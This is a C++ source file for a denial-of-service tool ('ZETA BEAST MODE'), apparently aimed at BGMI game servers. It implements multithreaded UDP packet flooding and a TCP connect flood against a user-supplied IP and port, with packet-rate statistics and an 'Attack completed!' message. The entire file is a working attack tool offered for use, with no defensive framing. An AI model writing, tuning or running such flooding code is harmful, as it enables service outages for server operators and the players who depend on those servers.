// bgmi_beast.cpp
// Compile: g++ -O3 -pthread -o bgmi_beast bgmi.c

#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <cstring>
#include <random>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>      // ← ADDED THIS LINE

// ============================================================
// CONFIGURATION
// ============================================================
#define DEFAULT_THREADS 8
#define PKT_MIN_SIZE 64
#define PKT_MAX_SIZE 1400
#define STATS_INTERVAL_MS 2000

std::atomic<bool> running(true);
std::atomic<long long> total_packets(0);

// ============================================================
// UDP FLOOD ENGINE
// ============================================================
class UDPFlooder {
private:
    int sock;
    struct sockaddr_in target_addr;
    std::mt19937 rng;
    std::uniform_int_distribution<int> size_dist;
    std::uniform_int_distribution<int> byte_dist;
    
public:
    UDPFlooder(const char* ip, int port) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) {
            throw std::runtime_error("Socket creation failed");
        }
        
        int buf_size = 1024 * 1024;
        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &target_addr.sin_addr);
        
        std::random_device rd;
        rng = std::mt19937(rd());
        size_dist = std::uniform_int_distribution<int>(PKT_MIN_SIZE, PKT_MAX_SIZE);
        byte_dist = std::uniform_int_distribution<int>(0, 255);
    }
    
    void flood(int duration_sec, int thread_id) {
        auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(duration_sec);
        long long packet_count = 0;
        std::vector<char> buffer(PKT_MAX_SIZE);
        
        while (running && std::chrono::steady_clock::now() < end_time) {
            int pkt_size = size_dist(rng);
            for (int i = 0; i < pkt_size; i++) {
                buffer[i] = static_cast<char>(byte_dist(rng));
            }
            
            int ret = sendto(sock, buffer.data(), pkt_size, 0,
                             (struct sockaddr*)&target_addr, sizeof(target_addr));
            if (ret > 0) {
                packet_count++;
            }
        }
        
        total_packets += packet_count;
        close(sock);
    }
};

// ============================================================
// TCP SYN FLOOD (FIXED)
// ============================================================
class TCPFlooder {
private:
    const char* target_ip;
    int target_port;
    
public:
    TCPFlooder(const char* ip, int port) : target_ip(ip), target_port(port) {}
    
    void flood(int duration_sec, int thread_id) {
        auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(duration_sec);
        long long packet_count = 0;
        
        while (running && std::chrono::steady_clock::now() < end_time) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;
            
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(target_port);
            inet_pton(AF_INET, target_ip, &addr.sin_addr);
            
            // Fixed: Get current flags and add O_NONBLOCK
            int flags = fcntl(sock, F_GETFL, 0);
            fcntl(sock, F_SETFL, flags | O_NONBLOCK);
            connect(sock, (struct sockaddr*)&addr, sizeof(addr));
            
            packet_count++;
            close(sock);
        }
        
        total_packets += packet_count;
    }
};

// ============================================================
// STATISTICS DISPLAY THREAD
// ============================================================
void stats_printer(int duration) {
    int elapsed = 0;
    long long last_packets = 0;
    
    while (running && elapsed < duration) {
        std::this_thread::sleep_for(std::chrono::milliseconds(STATS_INTERVAL_MS));
        elapsed += STATS_INTERVAL_MS / 1000;
        
        long long current = total_packets.load();
        long long delta = current - last_packets;
        double rate = delta / (STATS_INTERVAL_MS / 1000.0);
        
        std::cout << "Packets sent: " << current 
                  << " | Rate: " << (int)rate << " pps" << std::endl;
        last_packets = current;
    }
}

// ============================================================
// MAIN
// ============================================================
int main(int argc, char* argv[]) {
    std::cout << "ZETA BEAST MODE" << std::endl;
    
    if (argc < 4) {
        std::cout << "Usage: " << argv[0] << " <TARGET_IP> <PORT> <DURATION> [THREADS] [METHOD]" << std::endl;
        std::cout << "  METHOD: udp (default), tcp, both" << std::endl;
        return 1;
    }
    
    const char* target_ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int threads = (argc > 4) ? std::stoi(argv[4]) : DEFAULT_THREADS;
    std::string method = (argc > 5) ? argv[5] : "udp";
    
    std::cout << "Target: " << target_ip << ":" << port << std::endl;
    std::cout << "Duration: " << duration << "s | Threads: " << threads << " | Method: " << method << std::endl;
    
    signal(SIGPIPE, SIG_IGN);
    
    std::vector<std::thread> attack_threads;
    
    if (method == "udp") {
        UDPFlooder flooder(target_ip, port);
        for (int i = 0; i < threads; i++) {
            attack_threads.emplace_back(&UDPFlooder::flood, &flooder, duration, i);
        }
    } 
    else if (method == "tcp") {
        TCPFlooder flooder(target_ip, port);
        for (int i = 0; i < threads; i++) {
            attack_threads.emplace_back(&TCPFlooder::flood, &flooder, duration, i);
        }
    }
    else if (method == "both") {
        UDPFlooder udp_flooder(target_ip, port);
        TCPFlooder tcp_flooder(target_ip, port);
        int udp_threads = threads / 2;
        int tcp_threads = threads - udp_threads;
        for (int i = 0; i < udp_threads; i++) {
            attack_threads.emplace_back(&UDPFlooder::flood, &udp_flooder, duration, i);
        }
        for (int i = 0; i < tcp_threads; i++) {
            attack_threads.emplace_back(&TCPFlooder::flood, &tcp_flooder, duration, i);
        }
    }
    
    std::thread stats_thread(stats_printer, duration);
    
    for (auto& t : attack_threads) {
        t.join();
    }
    
    running = false;
    stats_thread.join();
    
    std::cout << "Attack completed! Total packets: " << total_packets.load() << std::endl;
    
    return 0;
}
